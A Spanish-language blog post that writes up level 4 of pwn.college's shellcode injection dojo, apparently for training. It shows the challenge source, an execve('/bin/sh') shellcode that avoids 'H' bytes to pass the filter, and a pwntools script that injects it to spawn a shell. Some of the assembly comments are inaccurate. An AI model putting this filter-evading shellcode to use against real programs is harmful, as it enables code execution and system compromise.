---
layout: post
title: Shellcode Injection Dojo - level 4
comments: true
categories: [Pwn, Writeups, Pwn.college]
---

En esta serie de posts nos dedicaremos a resolver los ejercicios de *shellcoding* de [pwn.college](https://pwn.college/program-security/shellcode-injection/). 

<br>
![Image]({{ site.baseurl }}/images/posts/pwn-college/yellow.svg){:width="200px"}
<br>

# Reconocimiento

Este será el primero, por lo tanto no será un ejercicio difícil. En `/challenge/babyshell-level-4.c`:


```c
void *shellcode;
size_t shellcode_size;

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    puts("This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
    puts("as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
    puts("practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
    puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
    for (int i = 3; i < 10000; i++) close(i);
    for (char **a = argv; *a != NULL; a++) memset(*a, 0, strlen(*a));
    for (char **a = envp; *a != NULL; a++) memset(*a, 0, strlen(*a));

    shellcode = mmap((void *)0x2232c000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x2232c000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes from stdin.\n");
    shellcode_size = read(0, shellcode, 0x1000);
    assert(shellcode_size > 0);

    puts("Executing filter...\n");
    puts("This challenge requires that your shellcode have no H bytes!\n");
    for (int i = 0; i < shellcode_size; i++)
        if (((uint8_t *)shellcode)[i] == 'H')
        {
            printf("Failed filter at byte %d!\n", i);
            exit(1);
        }

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    puts("Executing shellcode!\n");
    ((void(*)())shellcode)();

    printf("### Goodbye!\n");
}
```

Simplemente lee `0x1000 bytes` y los ejecuta, teniendo en cuenta eso sí que no se utilice `H`.

# Explotación

De primeras podríamos probar con algo así:

```java
; Preparación de la syscall execve
push 59                    ; Syscall number for execve
pop rax                    ; rax = 59 (syscall number)
cdq                        ; edx = 0 (envp = NULL)
push rdx                    ; NULL
pop rsi                    ; rsi = NULL (argv)

; Coloca la cadena '/bin/sh' en el stack
; Primero coloca '/bin'
mov rcx, 0x0068732f6e69622f ; 'bin//' en hexadecimal
push rcx                    ; Coloca '/bin' en el stack

; Luego coloca 'sh'
xor rdx, rdx                ; rdx = 0 (envp = NULL)
push rdx                    ; NULL
mov rcx, 0x68732f2f         ; 'sh' en hexadecimal
push rcx                    ; Coloca 'sh' en el stack

; Prepara los argumentos de execve
push rsp                    ; Dirección de la cadena '/bin//sh'
pop rdi                     ; rdi = "/bin//sh" (primer argumento)

syscall                     ; Llamada al sistema para ejecutar execve
```

Sin embargo, recibiremos una salida con `Failed filter at byte 6!`, Ya que el shellcode contiene dicho byte (`0x48`), esto podemos verlo imprimiendo el shellcode: `b'j;X\x99R^H\xb9/bin/sh\x00QH1\xd2RH\xc7\xc1//shQT_\x0f\x05'`.

## Shellcode sin H

Un posible shellcode es el siguiente:

```java
push 0x68                      ; Coloca 0x68 en el stack (representa 'h' en 'sh')
push 0x6e69622f                ; Coloca 'bin/' (en hexadecimal) en el stack
mov dword ptr [rsp+4], 0x732f2f2f ; Mueve '///s' al espacio de la pila, creando la cadena '/bin/sh'
push rsp                       ; Apila la dirección de '/bin/sh'
pop rdi                        ; Coloca la dirección de '/bin/sh' en rdi (primer argumento para execve)

push 0x2d006873                ; Coloca 'h-s' en el stack
mov dword ptr [rsp+4], 0x70     ; Coloca 'p' en la pila para completar el argumento
xor esi, esi                   ; Rellena rsi con 0 (para 'argv')
push rsi                        ; Empuja 0 (NULL) a rsi
push rsp                        ; Apila la dirección de los argumentos
add dword ptr [rsp], 0xb         ; Agrega 0xb a la dirección de la pila (creando el string para execve)
push rsp                        ; Apila la dirección final
add dword ptr [rsp], 0x10        ; Realiza un pequeño ajuste en el puntero de la pila
push rsp                        ; Apila nuevamente
pop rsi                         ; Coloca la dirección en rsi (como segundo argumento de execve)
xor edx, edx                    ; Establece edx a NULL (tercer argumento de execve)
push 0x3b                       ; Coloca 0x3b (el número de syscall para execve)
pop rax                         ; Coloca el número de syscall (59 para execve) en rax
syscall                         ; Llama a la syscall (ejecuta execve)
```

Con este shellcode nos saltamos la limitación y conseguimos la shell:

<br>
![Image]({{ site.baseurl }}/images/posts/pwn-college/shellcoding-level-4.png){:width="900px"}
<br>

## Script

```python
#! /bin/python3

from pwn import *

context.arch = 'amd64'

shellcode = asm("""
    push 0x68
    push 0x6e69622f
    mov dword ptr [rsp+4], 0x732f2f2f
    push rsp
    pop rdi
    push 0x2d006873
    mov dword ptr [rsp+4], 0x70
    xor esi, esi
    push rsi
    push rsp
    add dword ptr [rsp], 0xb
    push rsp
    add dword ptr [rsp], 0x10
    push rsp
    pop rsi
    xor edx, edx
    push 0x3b
    pop rax
    syscall
""")

print(shellcode)

print(asm("""
    xor rdi, rdi"""))

p = process("/challenge/babyshell-level-4")

p.send(shellcode)

p.interactive()
```

<br>
![Image]({{ site.baseurl }}/images/posts/pwn-college/shellcoding-level-4-flag.png){:width="700px"}
<br>